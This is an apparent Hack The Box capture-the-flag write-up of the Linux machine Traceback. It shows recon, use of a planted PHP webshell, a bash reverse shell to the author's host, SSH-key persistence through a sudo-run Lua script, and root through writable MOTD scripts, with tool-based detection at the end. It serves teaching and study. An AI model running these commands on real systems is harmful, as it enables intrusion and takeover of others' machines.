---
title: HTB: Traceback
url: https://0xdf.gitlab.io/2020/08/15/htb-traceback.html
date: 2020-08-15T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-traceback, ctf, hackthebox, nmap, webshell, vim, gobuster, smevk, lua, luvit, ssh, motd, linpeas, linenum
---

![Traceback](https://0xdfimages.gitlab.io/img/traceback-cover.png)

Traceback starts with finding a webshell that’s already one the server with some enumeration and a bit of open source research. From there, I’ll pivot to the next user with sudo that allows me to run Luvit, a Lua interpreter. To get root, I’ll notice that I can write to the message of the day directory. These scripts are run by root whenever a user logs in. I actually found this by seeing the cron that cleans up scripts dropped in this directory, but I’ll also show how to find it with some basic enumeration as well. In Beyond Root, I’ll take a quick look at the cron that’s cleaning up every thiry seconds.

## Box Info

| Name | [Traceback](https://hackthebox.com/machines/traceback)  [Traceback](https://hackthebox.com/machines/traceback) [Play on HackTheBox](https://hackthebox.com/machines/traceback) |
| --- | --- |
| Release Date | [14 Mar 2020](https://twitter.com/hackthebox_eu/status/1238116828842508289) |
| Retire Date | 15 Aug 2020 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Traceback |
| Radar Graph | Radar chart for Traceback |
| First Blood User | 00:08:19[sampriti sampriti](https://app.hackthebox.com/users/836) |
| First Blood Root | 00:15:17[sampriti sampriti](https://app.hackthebox.com/users/836) |
| Creator | [Xh4H Xh4H](https://app.hackthebox.com/users/21439) |

## Recon

### nmap

`nmap` shows the common Linux TCP port combination of SSH (22) and HTTP (80):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.181
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-15 06:35 EDT
Nmap scan report for 10.10.10.181
Host is up (0.020s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.04 seconds

root@kali# nmap -p 22,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.181
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-15 06:36 EDT
Nmap scan report for 10.10.10.181
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.54 seconds

```

Based on the [Apache](https://packages.ubuntu.com/search?keywords=apache2) and [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) versions, the OS looks like Ubuntu 18.04 bionic.

### Website - TCP 80

#### Site

The page just has a message from Xh4H, who has hacked the site and left a backdoor:

![image-20200315063908579](https://0xdfimages.gitlab.io/img/image-20200315063908579.png)

In the page source, there’s a comment about a webshell:

```

<body>
	<center>
		<h1>This site has been owned</h1>
		<h2>I have left a backdoor for all the net. FREE INTERNETZZZ</h2>
		<h3> - Xh4H - </h3>
		<!--Some of the best web shells that you might need ;)-->
	</center>
</body>

```

#### Find Webshells

I kicked off a `gobuster` in the background, but it wouldn’t find anything. I googled the term “Some of the best web shells that you might need”, and the top hit was a nice match:

![image-20200315073308357](https://0xdfimages.gitlab.io/img/image-20200315073308357.png)

#### Make Wordlist

[The page](https://github.com/TheBinitGhimire/Web-Shells) has 16 php webshells, a small enough list that I could just type them in, but I’d prefer to make a wordlist, and with some `vim`-foo, it’s not hard.

I copied the text off the GitHub page, and (after `:set paste` and `i`), pasted them into an empty `vim` window:

![image-20200315073648493](https://0xdfimages.gitlab.io/img/image-20200315073648493.png)

First, I got rid of the column of whitespace by starting at the start of the file, hitting Ctrl-v, and arrowing down to select all the tabs. Then I hit Delete:

![image-20200315073810989](https://0xdfimages.gitlab.io/img/image-20200315073810989.png)

To clean a line, I’ll enter `/ [enter]d$[down arrow][Home]`. That will find the next space, delete to the end of the line, and then go to the start of the next line.

![image-20200315074057379](https://0xdfimages.gitlab.io/img/image-20200315074057379.png)

I’ll hit `qq` to start recording a macro named `q`, and then clear the next line with `/ [enter]d$[down arrow][home]`. `[Esc]q` will stop the recording. Now I can hit `@q` to run that same pattern once, or `14@q` to run it on the rest of the lines.

```

alfa3.php
alfav3.0.1.php
andela.php
bloodsecv4.php
by.php
c99ud.php
cmd.php
configkillerionkros.php
jspshell.jsp
mini.php
obfuscated-punknopass.php
punk-nopass.php
punkholic.php
r57.php
smevk.php
wso2.8.5.php

```

#### Check for WebShells

Now I’ll `gobuster` with that wordlist, and find the webshell, `smevk.php`:

```

root@kali# gobuster dir -u http://10.10.10.181 -w php_shells.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.181
[+] Threads:        10
[+] Wordlist:       php_shells.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/03/15 07:42:43 Starting gobuster
===============================================================
/smevk.php (Status: 200)
===============================================================
2020/03/15 07:42:45 Finished
===============================================================

```

## Shell as webadmin

Visiting that path provides a login screen:

![image-20200315115957319](https://0xdfimages.gitlab.io/img/image-20200315115957319.png)

I can see in the source that the default login is admin/admin:

```

$UserName = "admin";                                      //Your UserName here.
$auth_pass = "admin";                                  //Your Password.

```

And it works, letting me into the webshell where I can see the various options:

![image-20200315121522863](https://0xdfimages.gitlab.io/img/image-20200315121522863.png)

There’s a lot of capability here, but I just want a shell, so I’ll start `nc` listening on my host, and enter `bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'` into the Execute box:

```

root@kali# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.181] 40482
bash: cannot set terminal process group (546): Inappropriate ioctl for device
bash: no job control in this shell
webadmin@traceback:/var/www/html$ id
uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)

```

This seems to hang the webshell. I quickly added a RSA public key to `/home/webadmin/.ssh/authorized_keys`, and got an SSH connection. In fact, I could have done that through the webshell.

## Priv: webadmin –> sysadmin

### Enumeration

The home directory doesn’t have `user.txt`, but it does have a note:

```

webadmin@traceback:~$ ls -l
total 4
-rw-rw-r-- 1 sysadmin sysadmin 122 Mar 16 03:53 note.txt

```

`note.txt` is from the other user on the box, sysadmin:

```

webadmin@traceback:~$ cat note.txt 
- sysadmin -
I have left this tool to practice Lua. Contact me if you have any question.

```

Additionally, webadmin can run `luvit` as sysadmin without a password using `sudo`:

```

webadmin@traceback:~$ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/webadmin/luvit

```

[Luvit](https://luvit.io/) is a Async I/O for Lua, similar to Node.js.

In webadmin’s `.bash_history` file, there’s the commands that presumably the attacker ran:

```

webadmin@traceback:~$ cat .bash_history 
ls -la
sudo -l
nano privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
rm privesc.lua
logout

```

I can’t access `/home/sysadmin`, but the `luvit` binary must be there because running it starts a [repl](https://en.wikipedia.org/wiki/Read%E2%80%93eval%E2%80%93print_loop):

```

webadmin@traceback:~$ /home/sysadmin/luvit
-bash: /home/sysadmin/luvit: Permission denied
webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit
Welcome to the Luvit repl!
> 

```

### Write SSH Key

I’ll create a simple Lua script that writes my SSH key into sysadmin’s `authorized_keys` file at `/dev/shm/.0xdf.lua`:

```

authkeys = io.open("/home/sysadmin/.ssh/authorized_keys", "a")
authkeys:write("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing\n")
authkeys:close()

```

The filename is arbitrary, but it does need to end in `.lua`.

Running it fails on it’s own, but using `sudo` to run as sysadmin works without issue:

```

webadmin@traceback:~$ /home/sysadmin/luvit /dev/shm/.0xdf.lua 
-bash: /home/sysadmin/luvit: Permission denied

webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit /dev/shm/.0xdf.lua

```

### SSH

Now I can SSH as sysadmin:

```

root@kali# ssh -i ~/keys/ed25519_gen sysadmin@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Mar  6 02:31:26 2020 from 10.10.14.6
$ 

```

I’ll note the welcome message, “OWNED BY XH4H”. It seems that attacker changed the welcome message.

After running `bash` to get a better shell, grab user.txt:

```

sysadmin@traceback:~$ cat user.txt
c2434970************************

```

## Priv: sysadmin –> root

### Enumeration

After looking around for a few minutes and not finding much, I uploaded [pspy](https://github.com/DominicBreuker/pspy). I saw that every minute, there looked like a Cron restoring `/etc/update-motd.d/`:

```

2020/03/15 09:38:01 CMD: UID=0    PID=1445   | sleep 30 
2020/03/15 09:38:01 CMD: UID=0    PID=1444   | /bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 
2020/03/15 09:38:01 CMD: UID=0    PID=1443   | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 
2020/03/15 09:38:01 CMD: UID=0    PID=1442   | /usr/sbin/CRON -f 
2020/03/15 09:38:01 CMD: UID=0    PID=1441   | /usr/sbin/CRON -f 
2020/03/15 09:38:31 CMD: UID=0    PID=1447   | /bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/ 

```

In fact, the update seems to run twice, with the cron, and after a 30 second sleep.

If I run a `ps auxww`, there’s a 50% chance I’ll see the `sleep` and clean in there:

```

sysadmin@traceback:~$ ps auxww
...[snip]...
root      33389  0.0  0.0  58792  3100 ?        S    12:31   0:00 /usr/sbin/CRON -f
root      33392  0.0  0.0   4628   776 ?        Ss   12:31   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
root      33393  0.0  0.0   7468   760 ?        S    12:31   0:00 sleep 30
...[snip]...

```

This led me to look at these directories. I can’t write in `/var/backups/.update-motd.d`. But the files in `/etc/update-motd.d` are writable by the sysadmin group:

```

sysadmin@traceback:/etc$ ls -l update-motd.d/
total 24
-rwxrwxr-x 1 root sysadmin  981 Mar 15 09:39 00-header
-rwxrwxr-x 1 root sysadmin  982 Mar 15 09:39 10-help-text
-rwxrwxr-x 1 root sysadmin 4264 Mar 15 09:39 50-motd-news
-rwxrwxr-x 1 root sysadmin  604 Mar 15 09:39 80-esm
-rwxrwxr-x 1 root sysadmin  299 Mar 15 09:39 91-release-upgrade

```

These are the scripts that root runs each time a user logs into the box. Looking at one of these, I can see they are each shell scripts:

```

sysadmin@traceback:/etc/update-motd.d$ cat 91-release-upgrade 
#!/bin/sh

# if the current release is under development there won't be a new one
if [ "$(lsb_release -sd | cut -d' ' -f4)" = "(development" ]; then
    exit 0
fi
if [ -x /usr/lib/ubuntu-release-upgrader/release-upgrade-motd ]; then
    exec /usr/lib/ubuntu-release-upgrader/release-upgrade-motd
fi

```

According to the [man pages](http://manpages.ubuntu.com/manpages/trusty/man5/update-motd.5.html), these files are:

> ```

> executed by pam_motd(8) as the root user at
> each  login,  and  this information is concatenated in /var/run/motd.  The order of script
> execution is determined by the run-parts(8) --lsbsysinit  option  (basically  alphabetical
> order, with a few caveats).
>
> ```

I had noted earlier that the attacker changed the MOTD. It seems like an obvious hint (in hindsight). I’ll look in [Beyond Root](#motd-enumeration) at how I could have detected this without the cron.

### Shell

I could add a reverse shell into one of these, but instead I’ll add code to get my public key into `/root/.ssh/authorized_keys`:

```

sysadmin@traceback:/etc/update-motd.d$ echo "cp /home/sysadmin/.ssh/authorized_keys /root/.ssh/" >> 00-header 

```

These files are going to be run when I SSH into the box. So I’ll immediately SSH into the box as webadmin before the 30 second cleanup happens. When I do, the `00-header` script is run, and now my public key should be in root’s `authorized_keys` file.

I’ll SSH in as root:

```

root@kali# ssh -i ~/keys/id_rsa_generated root@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Jan 24 03:43:29 2020
root@traceback:~# 

```

Now I can grab `root.txt`:

```

root@traceback:~# cat root.txt
ccda9e55************************

```

## Beyond Root

### Cron

Just to take a quick look at the cron that’s driving the cleanup, it is actually two crons:

```

root@traceback:~# crontab -l
...[snip]...
# m h  dom mon dow   command
* * * * * /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
* * * * * sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/

```

The first just runs, and the second does a `sleep` for 30 seconds, and then runs the same thing. This effectively has the cleanup run every 30 seconds.

### MOTD Enumeration

#### Background

I noticed that the MOTD folder was writable because I was looking for crons and noticed the cleanup. But if this weren’t a CTF, there would be no cleanup script. How could I have noticed it just by looking for the underlying vulnerability?

#### Manually

I noted that the attacker changed the message of the day. If I check manually, I can see that the directory and all the files in it are owned by root but the group id is sysadmin:

```

sysadmin@traceback:/etc$ find update-motd.d/ -ls
  1049055      4 drwxr-xr-x   2 root     sysadmin     4096 Aug 27  2019 update-motd.d/
  1049058      8 -rwxrwxr-x   1 root     sysadmin     4264 Aug 10 17:24 update-motd.d/50-motd-news
  1049057      4 -rwxrwxr-x   1 root     sysadmin      982 Aug 10 17:24 update-motd.d/10-help-text
  1050413      4 -rwxrwxr-x   1 root     sysadmin      299 Aug 10 17:24 update-motd.d/91-release-upgrade
  1049056      4 -rwxrwxr-x   1 root     sysadmin      981 Aug 10 17:24 update-motd.d/00-header
  1049059      4 -rwxrwxr-x   1 root     sysadmin      604 Aug 10 17:24 update-motd.d/80-esm

```

This is enough to modify one of these files.

#### LinPEAS

But rather than remembering to check each time, it’s nicer to have a script that does it for me. [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) will report files modified recently:

```

[+] Modified interesting files in the last 5mins
/etc/update-motd.d/50-motd-news
/etc/update-motd.d/10-help-text
/etc/update-motd.d/91-release-upgrade
/etc/update-motd.d/00-header
/etc/update-motd.d/80-esm 

```

But this is also part of the cleanup.

It is called out as an interesting file that is group writable:

```

[+] Interesting GROUP writable files (not in Home)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
  Group sysadmin:
/etc/update-motd.d/50-motd-news
/etc/update-motd.d/10-help-text
/etc/update-motd.d/91-release-upgrade
/etc/update-motd.d/00-header
/etc/update-motd.d/80-esm
/home/webadmin/note.txtq

```

That’s probably the tip I could use to find it.

#### LinEnum

does much worse, not highlighting this vulnerability at all in the standard configuration.

I always run it with `-t` (or actually just edit the original file so that thorough tests are enabled), and that does give similar output to LinPEAS. There a check for files not owned by the current user by writable by group:

```

[-] Files not owned by user but writable by group:
-rwxrwxr-x 1 root sysadmin 4264 Aug 13 10:43 /etc/update-motd.d/50-motd-news
-rwxrwxr-x 1 root sysadmin 982 Aug 13 10:43 /etc/update-motd.d/10-help-text
-rwxrwxr-x 1 root sysadmin 299 Aug 13 10:43 /etc/update-motd.d/91-release-upgrade
-rwxrwxr-x 1 root sysadmin 981 Aug 13 10:43 /etc/update-motd.d/00-header
-rwxrwxr-x 1 root sysadmin 604 Aug 13 10:43 /etc/update-motd.d/80-esm   

```